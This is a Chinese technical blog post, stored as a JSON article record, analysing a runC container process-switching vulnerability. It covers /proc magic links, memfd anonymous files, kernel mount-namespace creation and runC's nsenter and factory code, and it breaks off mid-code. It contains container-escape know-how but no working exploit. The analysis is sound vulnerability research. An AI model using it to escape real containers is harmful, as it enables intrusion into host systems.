{"title":"容器进程切换漏洞","uid":"2f1f68ab5dfcea1c92e15793016ea760","slug":"容器进程切换漏洞","date":"2022-02-13T10:48:45.000Z","updated":"2023-04-12T02:36:51.343Z","comments":true,"path":"api/articles/容器进程切换漏洞.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/docker.3x87dx4ktik0.png","content":"<h1 id=\"容器进程切换思考\"><a href=\"#容器进程切换思考\" class=\"headerlink\" title=\"容器进程切换思考\"></a>容器进程切换思考</h1><h2 id=\"前置技术\"><a href=\"#前置技术\" class=\"headerlink\" title=\"前置技术\"></a>前置技术</h2><h3 id=\"Magic-Link\"><a href=\"#Magic-Link\" class=\"headerlink\" title=\"Magic Link\"></a>Magic Link</h3><p>​        /proc/目录下存在很多的链接文件，但是在Linux 也存在一种特殊的链接文件，这种文件的大小为0，我们知道普通的链接文件的大小等于链接目标的文件路径长度，但是Magic Link的大小为0，它们在打开方式上面也存在差别，普通链接文件会解析出链接文件的路径然后进行打开操作，但是Magic LInk的话不会这样，它会调用内核专门的处理函数，然后返回目标文件的文件描述符。</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-20220108111923899.6057om2d7p4.png\" alt=\"image-20220108111923899\"></p>\n<h3 id=\"匿名文件\"><a href=\"#匿名文件\" class=\"headerlink\" title=\"匿名文件\"></a>匿名文件</h3><p>​        Linux <a href=\"https://stackoverflow.com/questions/21617539/what-exactly-are-anonymous-files\">Anonymous Files</a>，也叫匿名文件，匿名文件和普通的文件十分类似，可以被定义，修改，写入，读取等等，但是和普通文件不同的是它并不是一个实体的文件，当用户使用memfd_create创建一个匿名文件的时候会返回一个文件描述符，一旦对这个文件描述符的所有引用都被丢弃的时候，该匿名文件就会被销毁，而且在该文件的整个生命周期中都是存在于内存的RAM当中，并不具备实体的文件。</p>\n<h3 id=\"mount-namespace是如何实现的？\"><a href=\"#mount-namespace是如何实现的？\" class=\"headerlink\" title=\"mount namespace是如何实现的？\"></a>mount namespace是如何实现的？</h3><p>​        首先要了解在内核进程结构体<a href=\"https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L723\">task_struct</a>里面存在一个nsproxy成员：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">task_struct</span> <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token comment\">/* Namespaces: */</span>\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">nsproxy</span>\t\t\t<span class=\"token operator\">*</span>nsproxy<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>nsproxy结构体如下：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">nsproxy</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token class-name\">atomic_t</span> count<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">uts_namespace</span> <span class=\"token operator\">*</span>uts_ns<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">ipc_namespace</span> <span class=\"token operator\">*</span>ipc_ns<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">mnt_namespace</span> <span class=\"token operator\">*</span>mnt_ns<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">pid_namespace</span> <span class=\"token operator\">*</span>pid_ns_for_children<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">net</span> \t     <span class=\"token operator\">*</span>net_ns<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">time_namespace</span> <span class=\"token operator\">*</span>time_ns<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">time_namespace</span> <span class=\"token operator\">*</span>time_ns_for_children<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">cgroup_namespace</span> <span class=\"token operator\">*</span>cgroup_ns<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到各种不同的namespace都有自己的相关结构体，但是本文着重介绍mount namespace相关实现，因此通过追踪内核中进程的创建过程发现mount namespace的实现如下：</p>\n<p>内核函数调用链：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token function\">kernel_clone</span><span class=\"token punctuation\">(</span>_do_fork<span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span> copy_process<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在<a href=\"https://elixir.bootlin.com/linux/latest/source/kernel/fork.c#L1930\">copy_process</a>中发现大量和namespace相关的信息：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">static</span> __latent_entropy <span class=\"token keyword\">struct</span> <span class=\"token class-name\">task_struct</span> <span class=\"token operator\">*</span><span class=\"token function\">copy_process</span><span class=\"token punctuation\">(</span>\n\t\t\t\t\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">pid</span> <span class=\"token operator\">*</span>pid<span class=\"token punctuation\">,</span>\n\t\t\t\t\t<span class=\"token keyword\">int</span> trace<span class=\"token punctuation\">,</span>\n\t\t\t\t\t<span class=\"token keyword\">int</span> node<span class=\"token punctuation\">,</span>\n\t\t\t\t\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">kernel_clone_args</span> <span class=\"token operator\">*</span>args<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">int</span> pidfd <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> retval<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">task_struct</span> <span class=\"token operator\">*</span>p<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">multiprocess_signals</span> delayed<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">file</span> <span class=\"token operator\">*</span>pidfile <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\tu64 clone_flags <span class=\"token operator\">=</span> args<span class=\"token operator\">-&gt;</span>flags<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">nsproxy</span> <span class=\"token operator\">*</span>nsp <span class=\"token operator\">=</span> current<span class=\"token operator\">-&gt;</span>nsproxy<span class=\"token punctuation\">;</span>\n\n\t<span class=\"token comment\">/*\n\t * Don't allow sharing the root directory with processes in a different\n\t * namespace\n\t */</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>clone_flags <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>CLONE_NEWNS<span class=\"token operator\">|</span>CLONE_FS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>CLONE_NEWNS<span class=\"token operator\">|</span>CLONE_FS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">ERR_PTR</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>EINVAL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>clone_flags <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>CLONE_NEWUSER<span class=\"token operator\">|</span>CLONE_FS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>CLONE_NEWUSER<span class=\"token operator\">|</span>CLONE_FS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">ERR_PTR</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>EINVAL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到其实进程间的namespace可能具备某种继承关系，因此自然联想到系统0号进程，查阅相关资料发现存在init_task，它在内核刚启动的时候就进行了<a href=\"https://elixir.bootlin.com/linux/latest/source/init/main.c#L938\">初始化</a>，而且在<a href=\"https://elixir.bootlin.com/linux/latest/source/init/init_task.c#L123\">相关结构体</a>里面也确实找到了对于nsproxy的初始化：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n\t<span class=\"token punctuation\">.</span>nsproxy\t<span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>init_nsproxy<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>init_nsproxy的相关定义如下：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">nsproxy</span> init_nsproxy <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">.</span>count\t\t\t<span class=\"token operator\">=</span> <span class=\"token function\">ATOMIC_INIT</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token punctuation\">.</span>uts_ns\t\t\t<span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>init_uts_ns<span class=\"token punctuation\">,</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token function\">defined</span><span class=\"token punctuation\">(</span>CONFIG_POSIX_MQUEUE<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token function\">defined</span><span class=\"token punctuation\">(</span>CONFIG_SYSVIPC<span class=\"token punctuation\">)</span></span></span>\n\t<span class=\"token punctuation\">.</span>ipc_ns\t\t\t<span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>init_ipc_ns<span class=\"token punctuation\">,</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span>\n\t<span class=\"token punctuation\">.</span>mnt_ns\t\t\t<span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token punctuation\">.</span>pid_ns_for_children\t<span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>init_pid_ns<span class=\"token punctuation\">,</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_NET</span></span>\n\t<span class=\"token punctuation\">.</span>net_ns\t\t\t<span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>init_net<span class=\"token punctuation\">,</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_CGROUPS</span></span>\n\t<span class=\"token punctuation\">.</span>cgroup_ns\t\t<span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>init_cgroup_ns<span class=\"token punctuation\">,</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_TIME_NS</span></span>\n\t<span class=\"token punctuation\">.</span>time_ns\t\t<span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>init_time_ns<span class=\"token punctuation\">,</span>\n\t<span class=\"token punctuation\">.</span>time_ns_for_children\t<span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>init_time_ns<span class=\"token punctuation\">,</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以发现，mnt_ns的相关初始化函数是NULL，因此mnt_ns并不继承父进程命名空间，回过头来看之前的copy_namespaces函数，发现其中存在<a href=\"https://elixir.bootlin.com/linux/latest/source/kernel/nsproxy.c#L67\">create_new_namespaces</a>函数调用，在其中发现mnt_namespace确实是通过<a href=\"https://elixir.bootlin.com/linux/latest/source/fs/namespace.c#L3400\">copy_mnt_ns</a>函数新创建的，至此我们已经大致了解了整个mnt_namespace的实现和创建流程。同时，通过copy_mnt_ns函数大致了解到，其实就是提供了独立的文件系统视图，设置各种挂载点，因此只要帮助绕过视图的影响就可以绕过mount namespace，所以符号链接攻击一直也是容器的痛点问题之一。</p>\n<h3 id=\"runC-nsenter模块\"><a href=\"#runC-nsenter模块\" class=\"headerlink\" title=\"runC nsenter模块\"></a>runC nsenter模块</h3><p>​        在查看runC源码的时候发现nsenter模块，改模块的主要实现使用C语言写的，而且只在init.go的import中被引入，因此它的执行顺序是很靠前的。</p>\n<pre class=\"line-numbers language-go\" data-language=\"go\"><code class=\"language-go\"><span class=\"token keyword\">package</span> nsenter\n\n<span class=\"token comment\">/*\n#cgo CFLAGS: -Wall\nextern void nsexec();\nvoid __attribute__((constructor)) init(void) {\n\tnsexec();\n}\n*/</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"C\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在import “C”前面紧跟注释是cgo的一种特殊语法，注释里面包含的都是c语言的语法</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>​        在容器中执行docker run或者docker exec的时候，最终结果都是runC驱动执行用户想要执行的命令。同时，分析runC源码发现，无论是runC run还是runC exec，一个比较核心的思想就是创建一个runner结构体，然后调用其实现的run()函数：</p>\n<pre class=\"line-numbers language-go\" data-language=\"go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">execProcess</span><span class=\"token punctuation\">(</span>context <span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tcontainer<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> <span class=\"token function\">getContainer</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> err\n\t<span class=\"token punctuation\">}</span>\n\tstatus<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> container<span class=\"token punctuation\">.</span><span class=\"token function\">Status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> err\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">if</span> status <span class=\"token operator\">==</span> libcontainer<span class=\"token punctuation\">.</span>Stopped <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> errors<span class=\"token punctuation\">.</span><span class=\"token function\">New</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cannot exec in a stopped container\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">if</span> status <span class=\"token operator\">==</span> libcontainer<span class=\"token punctuation\">.</span>Paused <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>context<span class=\"token punctuation\">.</span><span class=\"token function\">Bool</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ignore-paused\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> errors<span class=\"token punctuation\">.</span><span class=\"token function\">New</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cannot exec in a paused container (use --ignore-paused to override)\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\tpath <span class=\"token operator\">:=</span> context<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"process\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> path <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">.</span><span class=\"token function\">Args</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> errors<span class=\"token punctuation\">.</span><span class=\"token function\">New</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"process args cannot be empty\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\tstate<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> container<span class=\"token punctuation\">.</span><span class=\"token function\">State</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> err\n\t<span class=\"token punctuation\">}</span>\n\tbundle <span class=\"token operator\">:=</span> utils<span class=\"token punctuation\">.</span><span class=\"token function\">SearchLabels</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">.</span>Config<span class=\"token punctuation\">.</span>Labels<span class=\"token punctuation\">,</span> <span class=\"token string\">\"bundle\"</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> <span class=\"token function\">getProcess</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">,</span> bundle<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> err\n\t<span class=\"token punctuation\">}</span>\n\n\tcgPaths<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> <span class=\"token function\">getSubCgroupPaths</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">.</span><span class=\"token function\">StringSlice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cgroup\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> err\n\t<span class=\"token punctuation\">}</span>\n\n\tr <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>runner<span class=\"token punctuation\">{</span>\n\t\tenableSubreaper<span class=\"token punctuation\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n\t\tshouldDestroy<span class=\"token punctuation\">:</span>   <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n\t\tcontainer<span class=\"token punctuation\">:</span>       container<span class=\"token punctuation\">,</span>\n\t\tconsoleSocket<span class=\"token punctuation\">:</span>   context<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"console-socket\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\t\tdetach<span class=\"token punctuation\">:</span>          context<span class=\"token punctuation\">.</span><span class=\"token function\">Bool</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"detach\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\t\tpidFile<span class=\"token punctuation\">:</span>         context<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pid-file\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\t\taction<span class=\"token punctuation\">:</span>          CT_ACT_RUN<span class=\"token punctuation\">,</span>\n\t\tinit<span class=\"token punctuation\">:</span>            <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n\t\tpreserveFDs<span class=\"token punctuation\">:</span>     context<span class=\"token punctuation\">.</span><span class=\"token function\">Int</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"preserve-fds\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\t\tsubCgroupPaths<span class=\"token punctuation\">:</span>  cgPaths<span class=\"token punctuation\">,</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">run</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>不过在此之前都会通过loadFactory类来创建基础的libcontainer以便和容器进行交互，在exec.go中，getContainer的一个重要功能就是创建libccontainer实例：</p>\n<pre class=\"line-numbers language-go\" data-language=\"go\"><code class=\"language-go\"><span class=\"token comment\">// loadFactory returns the configured factory instance for execing containers.</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">loadFactory</span><span class=\"token punctuation\">(</span>context <span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>libcontainer<span class=\"token punctuation\">.</span>Factory<span class=\"token punctuation\">,</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\troot <span class=\"token operator\">:=</span> context<span class=\"token punctuation\">.</span><span class=\"token function\">GlobalString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">)</span>\n\tabs<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> filepath<span class=\"token punctuation\">.</span><span class=\"token function\">Abs</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> err\n\t<span class=\"token punctuation\">}</span>\n\n\tintelRdtManager <span class=\"token operator\">:=</span> libcontainer<span class=\"token punctuation\">.</span>IntelRdtFs\n\n\t<span class=\"token comment\">// We resolve the paths for {newuidmap,newgidmap} from the context of runc,</span>\n\t<span class=\"token comment\">// to avoid doing a path lookup in the nsexec context. TODO: The binary</span>\n\t<span class=\"token comment\">// names are not currently configurable.</span>\n\tnewuidmap<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> exec<span class=\"token punctuation\">.</span><span class=\"token function\">LookPath</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"newuidmap\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\tnewuidmap <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n\t<span class=\"token punctuation\">}</span>\n\tnewgidmap<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> exec<span class=\"token punctuation\">.</span><span class=\"token function\">LookPath</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"newgidmap\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\tnewgidmap <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token keyword\">return</span> libcontainer<span class=\"token punctuation\">.</span><span class=\"token function\">New</span><span class=\"token punctuation\">(</span>abs<span class=\"token punctuation\">,</span> intelRdtManager<span class=\"token punctuation\">,</span>\n\t\tlibcontainer<span class=\"token punctuation\">.</span><span class=\"token function\">CriuPath</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">.</span><span class=\"token function\">GlobalString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"criu\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\t\tlibcontainer<span class=\"token punctuation\">.</span><span class=\"token function\">NewuidmapPath</span><span class=\"token punctuation\">(</span>newuidmap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\t\tlibcontainer<span class=\"token punctuation\">.</span><span class=\"token function\">NewgidmapPath</span><span class=\"token punctuation\">(</span>newgidmap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在结尾的New函数中，可以看到runC存储了一个MagicLink作为InitPath:</p>\n<pre class=\"line-numbers language-go\" data-language=\"go\"><code class=\"language-go\"><span class=\"token comment\">// New returns a linux based container factory based in the root directory and</span>\n<span class=\"token comment\">// configures the factory with the provided option funcs.</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">New</span><span class=\"token punctuation\">(</span>root <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> options <span class=\"token operator\">...</span><span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>LinuxFactory<span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>Factory<span class=\"token punctuation\">,</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">if</span> root <span class=\"token operator\">!=</span> <span class=\"token string\">\"\"</span> <span 